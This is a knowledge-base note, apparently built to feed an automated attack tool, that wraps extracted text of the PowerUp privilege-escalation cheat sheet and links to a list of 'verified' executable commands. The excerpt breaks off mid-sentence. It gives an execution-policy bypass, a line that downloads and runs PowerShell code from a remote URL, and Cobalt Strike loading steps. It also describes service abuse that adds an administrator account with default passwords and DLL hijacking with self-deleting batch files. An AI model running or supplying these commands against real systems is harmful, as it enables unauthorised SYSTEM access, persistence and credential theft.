---
title: "Trained Knowledge & Topology: PowerUp.pdf"
tags:
  - credential_access
  - http
  - john
  - mdp
  - pdf
  - powershell
  - privilege_escalation
  - trained
source_file: PowerUp.pdf
doc_type: pdf
updated: 2026-10-24 01:00:08
---

# Trained Knowledge & Architecture: `PowerUp.pdf`

- **Source Path:** `~/Projects/CORA/Training/PowerUp.pdf` (`pdf`)
- **Extracted Technical Entities:** `http, john, powershell`
- **Extracted IPs / Subnets:** `None`
- **Extracted Interfaces:** `None`
- **Linked Command Playbook:** [[commands/trained_powerup]] (`13` CEGAR-verified commands | `13` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `13` (full executable list in [[commands/trained_powerup]])
- **Tactic Distribution:** `Privilege_Escalation` (8), `Credential_Access` (5)
- **Top Extracted CLI Tools:** `install-servicebinary` (2), `enable-privilege` (1), `get-` (1), `get-modifiableservice` (1), `get-serviceunquoted` (1), `get-sitelistpassword` (1), `get-webconfig` (1), `import-module` (1), `invoke-` (1), `invoke-privescaudit` (1), `strings` (1), `write-hijackdll` (1)

## Extracted Reference Excerpt
--- [Page 1] ---
Version 1.2. Created by Will Schroeder (@harmj0y) and released under the Creative Commons v3 "Attribution" License. 
            PowerUp Cheat Sheet 
 
Getting Started 
Note: PowerUp’s ‘bleeding edge’ will always in be the 
development branch of PowerSploit. 
Get PowerUp: http://bit.ly/1PdjSHk 
Load from disk: 1) C:\> powershell –exec bypass 2) PS 
C:\> Import-Module PowerUp.ps1 
Load from GitHub: PS C:\> IEX (New-Object 
Net.WebClient).DownloadString("http://bit.ly/1PdjSHk") 
Load in Cobalt Strike’s Beacon: beacon> powershell-
import /local/path/to/PowerUp.ps1 , then beacon> 
powershell Invoke-AllChecks 
Getting help: PS C:\> Get-Help Cmdlet-Name [-detailed] [-
full] 
Most PowerUp functions are implemented in Empire in 
privesc/powerup/* 
Invoke-PrivescAudit (old Invoke-AllChecks) will run all 
current privilege escalation checks detailed in this guide 
and will output the appropriate abuse function syntax for 
anything found. The –HTMLReport flag will write out a 
HTML version of the report to SYSTEM.username.html. 
Enumerating Service Vulnerabilities 
Get-ModifiableService 
Enumerates all services 
where the current user can 
modify the service binPath. 
Get-
ModifiableServiceFile 
Enumerates all services 
where the current user can 
write to the associated 
service binary or its 
arguments. 
Get-ServiceUnquoted 
Enumerates all services w/ 
unquoted binary paths. 
Weaponizing Service Vulnerabilities 
Invoke-ServiceAbuse abuses a vulnerable service’s 
binPath to execute commands as SYSTEM. 
Install-ServiceBinary installs a malicious C# binary for a 
specified service. 
Both cmdlets accept the following parameters (as well as 
accepting a service names/service object from Get-
Service on the pipeline): 
Service name to abuse. 
-Name SERVICE 
The username to add 
(defaults to ‘john’). Domain 
users are not created, only 
added to the LocalGroup. 
-UserName 
‘[DOMAIN\]USER’ 
The password for the added 
user (defaults to 
‘Password123!’). 
-Password 
‘P@55Word’ 
The group to add the user to 
(default: ‘Administrators’). 
-LocalGroup “NAME” 
Custom command to execute. 
-Command “net…” 
Install-ServiceBinary backs up the original service path to 
\orig_path.exe.bak. Restore-ServiceBinary will restore 
this backup binary to its original path. 
Set-ServiceBinPath can set a service’s binPath without 
caling sc.exe. 
DLL Hijacking 
Find-PathDLLHijack checks if the current %PATH% has 
any directories that are writeable by the current user. 
Weaponizable for Windows 7 with Write-HijackDll and 
‘FOLDER\PATH\wlbsctrl.dll’. 
Write-HijackDll writes out a self-deleting .bat file to 
\hijackpath\debug.bat that executes a command, and 
writes out a hijackable DLL that launches the .bat. It 
accepts the same -UserName/-Password/-Command 
arguments as 

